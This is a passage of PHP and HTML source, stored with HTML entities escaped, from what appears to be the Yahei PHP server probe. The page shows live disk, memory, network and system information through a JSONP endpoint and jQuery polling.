for ($i &#x3D; 2; $i &lt; count($strs); $i++ )
&#123;
	preg_match_all( &quot;&#x2F;([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)&#x2F;&quot;, $strs[$i], $info );
	$NetOutSpeed[$i] &#x3D; $info[10][0];
	$NetInputSpeed[$i] &#x3D; $info[2][0];
	$NetInput[$i] &#x3D; formatsize($info[2][0]);
	$NetOut[$i]  &#x3D; formatsize($info[10][0]);
&#125;


&#x2F;&#x2F;ajax调用实时刷新

if ($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;rt&quot;)

&#123;

	$arr&#x3D;array(&#39;useSpace&#39;&#x3D;&gt;&quot;$du&quot;,&#39;freeSpace&#39;&#x3D;&gt;&quot;$df&quot;,&#39;hdPercent&#39;&#x3D;&gt;&quot;$hdPercent&quot;,&#39;barhdPercent&#39;&#x3D;&gt;&quot;$hdPercent%&quot;,&#39;TotalMemory&#39;&#x3D;&gt;&quot;$mt&quot;,&#39;UsedMemory&#39;&#x3D;&gt;&quot;$mu&quot;,&#39;FreeMemory&#39;&#x3D;&gt;&quot;$mf&quot;,&#39;CachedMemory&#39;&#x3D;&gt;&quot;$mc&quot;,&#39;Buffers&#39;&#x3D;&gt;&quot;$mb&quot;,&#39;TotalSwap&#39;&#x3D;&gt;&quot;$st&quot;,&#39;swapUsed&#39;&#x3D;&gt;&quot;$su&quot;,&#39;swapFree&#39;&#x3D;&gt;&quot;$sf&quot;,&#39;loadAvg&#39;&#x3D;&gt;&quot;$load&quot;,&#39;uptime&#39;&#x3D;&gt;&quot;$uptime&quot;,&#39;freetime&#39;&#x3D;&gt;&quot;$freetime&quot;,&#39;bjtime&#39;&#x3D;&gt;&quot;$bjtime&quot;,&#39;stime&#39;&#x3D;&gt;&quot;$stime&quot;,&#39;memRealPercent&#39;&#x3D;&gt;&quot;$memRealPercent&quot;,&#39;memRealUsed&#39;&#x3D;&gt;&quot;$memRealUsed&quot;,&#39;memRealFree&#39;&#x3D;&gt;&quot;$memRealFree&quot;,&#39;memPercent&#39;&#x3D;&gt;&quot;$memPercent%&quot;,&#39;memCachedPercent&#39;&#x3D;&gt;&quot;$memCachedPercent&quot;,&#39;barmemCachedPercent&#39;&#x3D;&gt;&quot;$memCachedPercent%&quot;,&#39;swapPercent&#39;&#x3D;&gt;&quot;$swapPercent&quot;,&#39;barmemRealPercent&#39;&#x3D;&gt;&quot;$memRealPercent%&quot;,&#39;barswapPercent&#39;&#x3D;&gt;&quot;$swapPercent%&quot;,&#39;NetOut2&#39;&#x3D;&gt;&quot;$NetOut[2]&quot;,&#39;NetOut3&#39;&#x3D;&gt;&quot;$NetOut[3]&quot;,&#39;NetOut4&#39;&#x3D;&gt;&quot;$NetOut[4]&quot;,&#39;NetOut5&#39;&#x3D;&gt;&quot;$NetOut[5]&quot;,&#39;NetOut6&#39;&#x3D;&gt;&quot;$NetOut[6]&quot;,&#39;NetOut7&#39;&#x3D;&gt;&quot;$NetOut[7]&quot;,&#39;NetOut8&#39;&#x3D;&gt;&quot;$NetOut[8]&quot;,&#39;NetOut9&#39;&#x3D;&gt;&quot;$NetOut[9]&quot;,&#39;NetOut10&#39;&#x3D;&gt;&quot;$NetOut[10]&quot;,&#39;NetInput2&#39;&#x3D;&gt;&quot;$NetInput[2]&quot;,&#39;NetInput3&#39;&#x3D;&gt;&quot;$NetInput[3]&quot;,&#39;NetInput4&#39;&#x3D;&gt;&quot;$NetInput[4]&quot;,&#39;NetInput5&#39;&#x3D;&gt;&quot;$NetInput[5]&quot;,&#39;NetInput6&#39;&#x3D;&gt;&quot;$NetInput[6]&quot;,&#39;NetInput7&#39;&#x3D;&gt;&quot;$NetInput[7]&quot;,&#39;NetInput8&#39;&#x3D;&gt;&quot;$NetInput[8]&quot;,&#39;NetInput9&#39;&#x3D;&gt;&quot;$NetInput[9]&quot;,&#39;NetInput10&#39;&#x3D;&gt;&quot;$NetInput[10]&quot;,&#39;NetOutSpeed2&#39;&#x3D;&gt;&quot;$NetOutSpeed[2]&quot;,&#39;NetOutSpeed3&#39;&#x3D;&gt;&quot;$NetOutSpeed[3]&quot;,&#39;NetOutSpeed4&#39;&#x3D;&gt;&quot;$NetOutSpeed[4]&quot;,&#39;NetOutSpeed5&#39;&#x3D;&gt;&quot;$NetOutSpeed[5]&quot;,&#39;NetInputSpeed2&#39;&#x3D;&gt;&quot;$NetInputSpeed[2]&quot;,&#39;NetInputSpeed3&#39;&#x3D;&gt;&quot;$NetInputSpeed[3]&quot;,&#39;NetInputSpeed4&#39;&#x3D;&gt;&quot;$NetInputSpeed[4]&quot;,&#39;NetInputSpeed5&#39;&#x3D;&gt;&quot;$NetInputSpeed[5]&quot;);

	$jarr&#x3D;json_encode($arr); 
	$_GET[&#39;callback&#39;] &#x3D; htmlspecialchars($_GET[&#39;callback&#39;]);

	echo $_GET[&#39;callback&#39;],&#39;(&#39;,$jarr,&#39;)&#39;;

	exit;

&#125;

?&gt;

&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;

&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;

&lt;head&gt;
&lt;title&gt;&lt;?php echo $title.$version; ?&gt;&lt;&#x2F;title&gt;
&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;EmulateIE7&quot; &#x2F;&gt;

&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;
&lt;!-- Powered by: Yahei.Net --&gt;

&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;
&lt;!--
* &#123;font-family: &quot;Microsoft Yahei&quot;,Tahoma, Arial; &#125;
body&#123;text-align: center; margin: 0 auto; padding: 0; background-color:#fafafa;font-size:12px;font-family:Tahoma, Arial&#125;
h1 &#123;font-size: 26px; padding: 0; margin: 0; color: #333333; font-family: &quot;Lucida Sans Unicode&quot;,&quot;Lucida Grande&quot;,sans-serif;&#125;
h1 small &#123;font-size: 11px; font-family: Tahoma; font-weight: bold; &#125;
a&#123;color: #666; text-decoration:none;&#125;
a.black&#123;color: #000000; text-decoration:none;&#125;
table&#123;width:100%;clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;
box-shadow: 1px 1px 1px #CCC;
-moz-box-shadow: 1px 1px 1px #CCC;
-webkit-box-shadow: 1px 1px 1px #CCC;
-ms-filter: &quot;progid:DXImageTransform.Microsoft.Shadow(Strength&#x3D;2, Direction&#x3D;135, Color&#x3D;&#39;#CCCCCC&#39;)&quot;;&#125;
th&#123;padding: 3px 6px; font-weight:bold;background:#dedede;color:#626262;border:1px solid #cccccc; text-align:left;&#125;
tr&#123;padding: 0; background:#FFFFFF;&#125;
td&#123;padding: 3px 6px; border:1px solid #CCCCCC;&#125;
.w_logo&#123;height:25px;text-align:center;color:#333;FONT-SIZE: 15px; width:13%; &#125;
.w_top&#123;height:25px;text-align:center; width:8.7%;&#125;
.w_top:hover&#123;background:#dadada;&#125;
.w_foot&#123;height:25px;text-align:center; background:#dedede;&#125;
input&#123;padding: 2px; background: #FFFFFF; border-top:1px solid #666666; border-left:1px solid #666666; border-right:1px solid #CCCCCC; border-bottom:1px solid #CCCCCC; font-size:12px&#125;
input.btn&#123;font-weight: bold; height: 20px; line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:12px&#125;
.bar &#123;border:1px solid #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.bar_1 &#123;border:1px dotted #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.barli_red&#123;background:#ff6600; height:5px; margin:0px; padding:0;&#125;
.barli_blue&#123;background:#0099FF; height:5px; margin:0px; padding:0;&#125;
.barli_green&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
.barli_black&#123;background:#333; height:5px; margin:0px; padding:0;&#125;
.barli_1&#123;background:#999999; height:5px; margin:0px; padding:0;&#125;
.barli&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
#page &#123;width: 960px; padding: 0 auto; margin: 0 auto; text-align: left;&#125;
#header&#123;position:relative; padding:5px;&#125;
.w_small&#123;font-family: Courier New;&#125;
.w_number&#123;color: #f800fe;&#125;
.sudu &#123;padding: 0; background:#5dafd1; &#125;
.suduk &#123; margin:0px; padding:0;&#125;
.resYes&#123;&#125;
.resNo&#123;color: #FF0000;&#125;
.word&#123;word-break:break-all;&#125;
--&gt;
&lt;&#x2F;style&gt;

&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;lib.sinaapp.com&#x2F;js&#x2F;jquery&#x2F;1.7&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;

&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; 

&lt;!--

$(document).ready(function()&#123;getJSONData();&#125;);
var OutSpeed2&#x3D;&lt;?php echo floor($NetOutSpeed[2]) ?&gt;;
var OutSpeed3&#x3D;&lt;?php echo floor($NetOutSpeed[3]) ?&gt;;
var OutSpeed4&#x3D;&lt;?php echo floor($NetOutSpeed[4]) ?&gt;;
var OutSpeed5&#x3D;&lt;?php echo floor($NetOutSpeed[5]) ?&gt;;
var InputSpeed2&#x3D;&lt;?php echo floor($NetInputSpeed[2]) ?&gt;;
var InputSpeed3&#x3D;&lt;?php echo floor($NetInputSpeed[3]) ?&gt;;
var InputSpeed4&#x3D;&lt;?php echo floor($NetInputSpeed[4]) ?&gt;;
var InputSpeed5&#x3D;&lt;?php echo floor($NetInputSpeed[5]) ?&gt;;

function getJSONData()

&#123;

	setTimeout(&quot;getJSONData()&quot;, 1000);

	$.getJSON(&#39;?act&#x3D;rt&amp;callback&#x3D;?&#39;, displayData);

&#125;
function ForDight(Dight,How)
&#123; 
  if (Dight&lt;0)&#123;
  	var Last&#x3D;0+&quot;B&#x2F;s&quot;;
  &#125;else if (Dight&lt;1024)&#123;
  	var Last&#x3D;Math.round(Dight*Math.pow(10,How))&#x2F;Math.pow(10,How)+&quot;B&#x2F;s&quot;;
  &#125;else if (Dight&lt;1048576)&#123;
  	Dight&#x3D;Dight&#x2F;1024;
  	var Last&#x3D;Math.round(Dight*Math.pow(10,How))&#x2F;Math.pow(10,How)+&quot;K&#x2F;s&quot;;
  &#125;else&#123;
  	Dight&#x3D;Dight&#x2F;1048576;
  	var Last&#x3D;Math.round(Dight*Math.pow(10,How))&#x2F;Math.pow(10,How)+&quot;M&#x2F;s&quot;;
  &#125;
	return Last; 
&#125;

function displayData(dataJSON)

&#123;
	$(&quot;#useSpace&quot;).html(dataJSON.useSpace);

	$(&quot;#freeSpace&quot;).html(dataJSON.freeSpace);
	$(&quot;#hdPercent&quot;).html(dataJSON.hdPercent);
	$(&quot;#barhdPercent&quot;).width(dataJSON.barhdPercent);

	$(&quot;#TotalMemory&quot;).html(dataJSON.TotalMemory);

	$(&quot;#UsedMemory&quot;).html(dataJSON.UsedMemory);

	$(&quot;#FreeMemory&quot;).html(dataJSON.FreeMemory);

	$(&quot;#CachedMemory&quot;).html(dataJSON.CachedMemory);
	$(&quot;#Buffers&quot;).html(dataJSON.Buffers);

	$(&quot;#TotalSwap&quot;).html(dataJSON.TotalSwap);

	$(&quot;#swapUsed&quot;).html(dataJSON.swapUsed);

	$(&quot;#swapFree&quot;).html(dataJSON.swapFree);

	$(&quot;#swapPercent&quot;).html(dataJSON.swapPercent);

	$(&quot;#loadAvg&quot;).html(dataJSON.loadAvg);

	$(&quot;#uptime&quot;).html(dataJSON.uptime);

	$(&quot;#freetime&quot;).html(dataJSON.freetime);

	$(&quot;#stime&quot;).html(dataJSON.stime);

	$(&quot;#bjtime&quot;).html(dataJSON.bjtime);

	$(&quot;#memRealUsed&quot;).html(dataJSON.memRealUsed);
	$(&quot;#memRealFree&quot;).html(dataJSON.memRealFree);
	$(&quot;#memRealPercent&quot;).html(dataJSON.memRealPercent);

	$(&quot;#memPercent&quot;).html(dataJSON.memPercent);
	$(&quot;#barmemPercent&quot;).width(dataJSON.memPercent);

	$(&quot;#barmemRealPercent&quot;).width(dataJSON.barmemRealPercent);
	$(&quot;#memCachedPercent&quot;).html(dataJSON.memCachedPercent);
	$(&quot;#barmemCachedPercent&quot;).width(dataJSON.barmemCachedPercent);

	$(&quot;#barswapPercent&quot;).width(dataJSON.barswapPercent);

	$(&quot;#NetOut2&quot;).html(dataJSON.NetOut2);

	$(&quot;#NetOut3&quot;).html(dataJSON.NetOut3);

	$(&quot;#NetOut4&quot;).html(dataJSON.NetOut4);

	$(&quot;#NetOut5&quot;).html(dataJSON.NetOut5);

	$(&quot;#NetOut6&quot;).html(dataJSON.NetOut6);

	$(&quot;#NetOut7&quot;).html(dataJSON.NetOut7);

	$(&quot;#NetOut8&quot;).html(dataJSON.NetOut8);

	$(&quot;#NetOut9&quot;).html(dataJSON.NetOut9);

	$(&quot;#NetOut10&quot;).html(dataJSON.NetOut10);
	$(&quot;#NetInput2&quot;).html(dataJSON.NetInput2);
	$(&quot;#NetInput3&quot;).html(dataJSON.NetInput3);
	$(&quot;#NetInput4&quot;).html(dataJSON.NetInput4);
	$(&quot;#NetInput5&quot;).html(dataJSON.NetInput5);
	$(&quot;#NetInput6&quot;).html(dataJSON.NetInput6);
	$(&quot;#NetInput7&quot;).html(dataJSON.NetInput7);
	$(&quot;#NetInput8&quot;).html(dataJSON.NetInput8);
	$(&quot;#NetInput9&quot;).html(dataJSON.NetInput9);
	$(&quot;#NetInput10&quot;).html(dataJSON.NetInput10);	
	$(&quot;#NetOutSpeed2&quot;).html(ForDight((dataJSON.NetOutSpeed2-OutSpeed2),3));	OutSpeed2&#x3D;dataJSON.NetOutSpeed2;
	$(&quot;#NetOutSpeed3&quot;).html(ForDight((dataJSON.NetOutSpeed3-OutSpeed3),3));	OutSpeed3&#x3D;dataJSON.NetOutSpeed3;
	$(&quot;#NetOutSpeed4&quot;).html(ForDight((dataJSON.NetOutSpeed4-OutSpeed4),3));	OutSpeed4&#x3D;dataJSON.NetOutSpeed4;
	$(&quot;#NetOutSpeed5&quot;).html(ForDight((dataJSON.NetOutSpeed5-OutSpeed5),3));	OutSpeed5&#x3D;dataJSON.NetOutSpeed5;
	$(&quot;#NetInputSpeed2&quot;).html(ForDight((dataJSON.NetInputSpeed2-InputSpeed2),3));	InputSpeed2&#x3D;dataJSON.NetInputSpeed2;
	$(&quot;#NetInputSpeed3&quot;).html(ForDight((dataJSON.NetInputSpeed3-InputSpeed3),3));	InputSpeed3&#x3D;dataJSON.NetInputSpeed3;
	$(&quot;#NetInputSpeed4&quot;).html(ForDight((dataJSON.NetInputSpeed4-InputSpeed4),3));	InputSpeed4&#x3D;dataJSON.NetInputSpeed4;
	$(&quot;#NetInputSpeed5&quot;).html(ForDight((dataJSON.NetInputSpeed5-InputSpeed5),3));	InputSpeed5&#x3D;dataJSON.NetInputSpeed5;

&#125;

--&gt;

&lt;&#x2F;script&gt;

&lt;&#x2F;head&gt;

&lt;body&gt;
&lt;a name&#x3D;&quot;w_top&quot;&gt;&lt;&#x2F;a&gt;

&lt;div id&#x3D;&quot;page&quot;&gt;

	
	&lt;table&gt;
		&lt;tr&gt;
			&lt;th class&#x3D;&quot;w_logo&quot;&gt;雅黑PHP探针&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_php&quot;&gt;PHP参数&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_module&quot;&gt;组件支持&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_module_other&quot;&gt;第三方组件&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_db&quot;&gt;数据库支持&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_performance&quot;&gt;性能检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_networkspeed&quot;&gt;网速检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_MySQL&quot;&gt;MySQL检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_function&quot;&gt;函数检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_mail&quot;&gt;邮件检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.yahei.net&#x2F;tz&#x2F;tz.zip&quot;&gt;探针下载&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
		&lt;&#x2F;tr&gt;
	&lt;&#x2F;table&gt;



&lt;!--服务器相关参数--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot;&gt;服务器参数&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器域名&#x2F;IP地址&lt;&#x2F;td&gt;

    &lt;td colspan&#x3D;&quot;3&quot;&gt;&lt;?php echo @get_current_user();?&gt; - &lt;?php echo $_SERVER[&#39;SERVER_NAME&#39;];?&gt;(&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR)&#123;echo $_SERVER[&#39;SERVER_ADDR&#39;];&#125;else&#123;echo @gethostbyname($_SERVER[&#39;SERVER_NAME&#39;]);&#125; ?&gt;)&amp;nbsp;&amp;nbsp;你的IP地址是：&lt;?php echo @$_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器标识&lt;&#x2F;td&gt;

    &lt;td colspan&#x3D;&quot;3&quot;&gt;&lt;?php if($sysInfo[&#39;win_n&#39;] !&#x3D; &#39;&#39;)&#123;echo $sysInfo[&#39;win_n&#39;];&#125;else&#123;echo @php_uname();&#125;;?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;13%&quot;&gt;服务器操作系统&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot;&gt;&lt;?php $os &#x3D; explode(&quot; &quot;, php_uname()); echo $os[0];?&gt; &amp;nbsp;内核版本：&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR)&#123;echo $os[2];&#125;else&#123;echo $os[1];&#125; ?&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;13%&quot;&gt;服务器解译引擎&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot;&gt;&lt;?php echo $_SERVER[&#39;SERVER_SOFTWARE&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器语言&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo getenv(&quot;HTTP_ACCEPT_LANGUAGE&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;服务器端口&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $_SERVER[&#39;SERVER_PORT&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;服务器主机名&lt;&#x2F;td&gt;

	  &lt;td&gt;&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR )&#123;echo $os[1];&#125;else&#123;echo $os[2];&#125; ?&gt;&lt;&#x2F;td&gt;

	  &lt;td&gt;绝对路径&lt;&#x2F;td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER[&#39;DOCUMENT_ROOT&#39;]?str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$_SERVER[&#39;DOCUMENT_ROOT&#39;]):str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,dirname(__FILE__));?&gt;&lt;&#x2F;td&gt;

	&lt;&#x2F;tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;管理员邮箱&lt;&#x2F;td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER[&#39;SERVER_ADMIN&#39;];?&gt;&lt;&#x2F;td&gt;

		&lt;td&gt;探针路径&lt;&#x2F;td&gt;

		&lt;td&gt;&lt;?php echo str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,__FILE__)?str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,__FILE__):$_SERVER[&#39;SCRIPT_FILENAME&#39;];?&gt;&lt;&#x2F;td&gt;

	&lt;&#x2F;tr&gt;	

&lt;&#x2F;table&gt;



&lt;?if(&quot;show&quot;&#x3D;&#x3D;$sysReShow)&#123;?&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;6&quot;&gt;服务器实时数据&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;13%&quot; &gt;服务器当前时间&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot; &gt;&lt;span id&#x3D;&quot;stime&quot;&gt;&lt;?php echo $stime;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;13%&quot; &gt;服务器已运行时间&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot; colspan&#x3D;&quot;3&quot;&gt;&lt;span id&#x3D;&quot;uptime&quot;&gt;&lt;?php echo $uptime;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;

    &lt;td width&#x3D;&quot;13%&quot;&gt;CPU型号 [&lt;?php echo $sysInfo[&#39;cpu&#39;][&#39;num&#39;];?&gt;核]&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;87%&quot; colspan&#x3D;&quot;5&quot;&gt;&lt;?php echo $sysInfo[&#39;cpu&#39;][&#39;model&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CPU使用状况&lt;&#x2F;td&gt;
    &lt;td colspan&#x3D;&quot;5&quot;&gt;&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR)&#123;echo $cpu_show.&quot; | &lt;a href&#x3D;&#39;&quot;.$phpSelf.&quot;?act&#x3D;cpu_percentage&#39; target&#x3D;&#39;_blank&#39; class&#x3D;&#39;static&#39;&gt;查看图表&lt;&#x2F;a&gt;&quot;;&#125;else&#123;echo &quot;暂时只支持Linux系统&quot;;&#125;?&gt;
	&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;硬盘使用状况&lt;&#x2F;td&gt;
    &lt;td colspan&#x3D;&quot;5&quot;&gt;
		总空间 &lt;?php echo $dt;?&gt;&amp;nbsp;G，
		已用 &lt;font color&#x3D;&#39;#333333&#39;&gt;&lt;span id&#x3D;&quot;useSpace&quot;&gt;&lt;?php echo $du;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&amp;nbsp;G，
		空闲 &lt;font color&#x3D;&#39;#333333&#39;&gt;&lt;span id&#x3D;&quot;freeSpace&quot;&gt;&lt;?php echo $df;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&amp;nbsp;G，
		使用率 &lt;span id&#x3D;&quot;hdPercent&quot;&gt;&lt;?php echo $hdPercent;?&gt;&lt;&#x2F;span&gt;%
		&lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barhdPercent&quot; class&#x3D;&quot;barli_black&quot; style&#x3D;&quot;width:&lt;?php echo $hdPercent;?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;
	&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;

		&lt;td&gt;内存使用状况&lt;&#x2F;td&gt;

		&lt;td colspan&#x3D;&quot;5&quot;&gt;

&lt;?php

$tmp &#x3D; array(

    &#39;memTotal&#39;, &#39;memUsed&#39;, &#39;memFree&#39;, &#39;memPercent&#39;,

    &#39;memCached&#39;, &#39;memRealPercent&#39;,

    &#39;swapTotal&#39;, &#39;swapUsed&#39;, &#39;swapFree&#39;, &#39;swapPercent&#39;

);

foreach ($tmp AS $v) &#123;

    $sysInfo[$v] &#x3D; $sysInfo[$v] ? $sysInfo[$v] : 0;

&#125;

?&gt;

          物理内存：共

          &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;?php echo $memTotal;?&gt; &lt;&#x2F;font&gt;

           , 已用

          &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;UsedMemory&quot;&gt;&lt;?php echo $mu;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;

          , 空闲

          &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;FreeMemory&quot;&gt;&lt;?php echo $mf;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;

          , 使用率

		  &lt;span id&#x3D;&quot;memPercent&quot;&gt;&lt;?php echo $memPercent;?&gt;&lt;&#x2F;span&gt;

          &lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barmemPercent&quot; class&#x3D;&quot;barli_green&quot; style&#x3D;&quot;width:&lt;?php echo $memPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;
&lt;?php
&#x2F;&#x2F;判断如果cache为0，不显示
if($sysInfo[&#39;memCached&#39;]&gt;0)
&#123;
?&gt;		
		  Cache化内存为 &lt;span id&#x3D;&quot;CachedMemory&quot;&gt;&lt;?php echo $mc;?&gt;&lt;&#x2F;span&gt;
		  , 使用率 
          &lt;span id&#x3D;&quot;memCachedPercent&quot;&gt;&lt;?php echo $memCachedPercent;?&gt;&lt;&#x2F;span&gt;
		  %	| Buffers缓冲为  &lt;span id&#x3D;&quot;Buffers&quot;&gt;&lt;?php echo $mb;?&gt;&lt;&#x2F;span&gt;
          &lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barmemCachedPercent&quot; class&#x3D;&quot;barli_blue&quot; style&#x3D;&quot;width:&lt;?php echo $memCachedPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;

          真实内存使用
          &lt;span id&#x3D;&quot;memRealUsed&quot;&gt;&lt;?php echo $memRealUsed;?&gt;&lt;&#x2F;span&gt;
		  , 真实内存空闲
          &lt;span id&#x3D;&quot;memRealFree&quot;&gt;&lt;?php echo $memRealFree;?&gt;&lt;&#x2F;span&gt;
		  , 使用率
          &lt;span id&#x3D;&quot;memRealPercent&quot;&gt;&lt;?php echo $memRealPercent;?&gt;&lt;&#x2F;span&gt;
          %
          &lt;div class&#x3D;&quot;bar_1&quot;&gt;&lt;div id&#x3D;&quot;barmemRealPercent&quot; class&#x3D;&quot;barli_1&quot; style&#x3D;&quot;width:&lt;?php echo $memRealPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; 
&lt;?php
&#125;
&#x2F;&#x2F;判断如果SWAP区为0，不显示
if($sysInfo[&#39;swapTotal&#39;]&gt;0)
&#123;
?&gt;	
          SWAP区：共
          &lt;?php echo $st;?&gt;
          , 已使用
          &lt;span id&#x3D;&quot;swapUsed&quot;&gt;&lt;?php echo $su;?&gt;&lt;&#x2F;span&gt;
          , 空闲
          &lt;span id&#x3D;&quot;swapFree&quot;&gt;&lt;?php echo $sf;?&gt;&lt;&#x2F;span&gt;
          , 使用率
          &lt;span id&#x3D;&quot;swapPercent&quot;&gt;&lt;?php echo $swapPercent;?&gt;&lt;&#x2F;span&gt;
          %
          &lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barswapPercent&quot; class&#x3D;&quot;barli_red&quot; style&#x3D;&quot;width:&lt;?php echo $swapPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;

&lt;?php
&#125;	
?&gt;		  

	  &lt;&#x2F;td&gt;

	&lt;&#x2F;tr&gt;
	  &lt;tr&gt;
		&lt;td&gt;系统平均负载&lt;&#x2F;td&gt;
